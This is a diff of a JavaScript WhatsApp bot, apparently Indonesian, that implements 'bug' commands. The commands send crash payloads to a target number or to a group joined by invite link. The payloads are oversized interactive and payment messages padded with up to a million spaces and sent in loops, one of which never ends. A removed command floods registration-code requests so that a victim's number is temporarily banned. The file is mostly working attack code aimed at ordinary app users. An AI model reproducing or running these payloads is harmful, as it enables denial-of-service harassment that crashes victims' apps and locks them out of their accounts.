@@ -42,11 +42,8 @@ const bochil = require("@bochilteam/scraper")
 const fakeUA = require('fake-useragent')
 const randomUA = fakeUA().toString()
 const fs = require('fs')
-const { uptotelegra } = require('./lib/upload')
-const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
 //=================================================//
 //=================================================//
-const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
 //=================================================//
 //=================================================//
 module.exports = Cexzas = async (Cexzas, m, chatUpdate, store) => {
@@ -84,11 +81,7 @@ const isMedia = /image|video|sticker|audio/.test(mime)
 //User
 const botNumber = await Cexzas.decodeJid(Cexzas.user.id)
 const itsMe = m.sender == botNumber ? true : false
-const kontributor = JSON.parse(fs.readFileSync('./Database/owner.json'))
-const iniseller = JSON.parse(fs.readFileSync('./Database/seller.json'))
-const contacts = JSON.parse(fs.readFileSync("./Database/contacts.json"))
-const isContacts = contacts.includes(m.sender)
-const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const kontributor = JSON.parse(fs.readFileSync('./lib/owner.json'))
 const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const from = mek.key.remoteJid
 //=================================================//
@@ -118,33 +111,6 @@ const imagenull2 = fs.readFileSync(`./lib/image/nulll2.jpg`)
 //=================================================//
 //=================================================//
 //=================================================//
-const moment = require('moment-timezone');
-const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
-let ucapanWaktu
-if (time >= "19:00:00" && time < "23:59:00") {
-ucapanWaktu = "🌃 Selamat Malam"
-} else if (time >= "15:00:00" && time < "19:00:00") {
-ucapanWaktu = "🌄 Selamat Sore"
-} else if (time >= "11:00:00" && time < "15:00:00") {
-ucapanWaktu = "🏞️ Selamat Siang"
-} else if (time >= "06:00:00" && time < "11:00:00") {
-ucapanWaktu = "🏙️ Selamat Pagi"
-} else {
-ucapanWaktu = "🌆 Selamat Subuh"
-}
-const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
-const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
-const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
-const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
-let d = new Date
-let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
-let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
-let week = d.toLocaleDateString("id", { weekday: "long" })
-let calender = d.toLocaleDateString("id", {
-day: "numeric",
-month: "long",
-year: "numeric"
-})
 //=================================================//
 //=================================================//
 //=================================================//
@@ -176,7 +142,7 @@ fromMe: false
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗡𝗘𝗫𝗭𝗢 𝗔𝗟𝗟𝗥𝗘𝗧 𝗘𝗥𝗥𝗢𝗥𝗥𝗥̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }]}}}}
 
 async function bakdok(target, kuwoted) {
@@ -217,7 +183,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `Nexzo`
+title: `bug`
 }
 }
 }
@@ -250,7 +216,7 @@ async function pirgam(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #Nexzodominate"
+        text: "›          #bugdominate"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(50000)
@@ -426,41 +392,7 @@ return Cexzas.sendMessage(m.chat, { text: teks }, { quoted: CexzasKece })
 
 let uptime = await runtime(process.uptime())
 switch (command) { 
-case 'banlimit': {
-if (!text) return m.reply(`Example: ${prefix + command} 91|6909137211`)
-if (!/|/.test(text)) return m.reply(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
-let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))
-let cCode = q.split("|")[0]
-let number = q.split("|")[1]
-let fullNo = cCode + number
-let { state, saveCreds } = await useMultiFileAuthState('session')
-let spam = makeWaSocket({
-auth: state,
-mobile: true,
-logger: pino({ level: 'silent' })
-})
-let dropNumber = async () => {
-try {
-let res = await spam.requestRegistrationCode({
-phoneNumber: `+${fullNo}`,
-phoneNumberCountryCode: cCode,
-phoneNumberNationalNumber: number,
-phoneNumberMobileCountryCode: 724,
-})
-if (res.reason === 'temporarily_unavailable') {
-console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
-await sleep(1000)
-await dropNumber()
-}
-} catch (error) {
-console.error}}
-numbers[fullNo] = { cCode, number };
-fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'))
-setInterval(() => {
-dropNumber()
-}, 400)}
-break
-case 'nexzo1': { 
+case 'bug1': { 
 if (!isDeveloper) return m.reply('Fitur Ini Khusus Owner')
 if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -468,40 +400,57 @@ if (bijipler.startsWith('0')) return m.replay(`Eror | Contoh : ${prefix+command}
 let target = bijipler + '@s.whatsapp.net'
 for (let j = 0; j < 30; j++) {
 await bakdok(target, force)
-await ngeloc(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)
-await ngeloc(target, force)
-await bakdok(target, force)}
+await ngeloc(target, force)}
 reply('Sukses Mengirim Bug')}
 break
-case 'nexzo2': {
-if (!q) return m.reply(`Contoh : ${prefix+command} 628xxx`)
+case 'bug2': { 
+if (!isDeveloper) return reply('Fitur Ini Khusus Owner')
+if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
 for (;;) {
-await aipong(target, force)
-await sleep(10000)} 
+await aipong(target, force)} 
 reply('Sukses')}
+break
+case 'bug-button': {
+if (!isDeveloper) return reply('Fithr Ini Khusus Owner')
+if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
+reply(mess.bugrespon)
+let result = args[0].split('https://chat.whatsapp.com/')[1];
+let target = await Cexzas.groupAcceptInvite(result);
+for (let j = 0; j < 5; j++) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
+message: {
+  "interactiveMessage": {
+    "header": {
+      "title": "",
+      "subtitle": " "
+    },
+    "body": {
+      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
+    },
+    "footer": {
+      "text": "›          #Cexzasdominate"
+    },
+    "nativeFlowMessage": {
+      "buttons": [
+        {
+          "name": "cta_url",
+          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
+        }
+      ],
+      "messageParamsJson": " ".repeat(1000000)
+    }
+  }
+}
+}
+}), { userJid: target, quoted: ryobug })
+await Cexzas.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+await sleep(700)
+}
+reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
 break
 default:
 }}
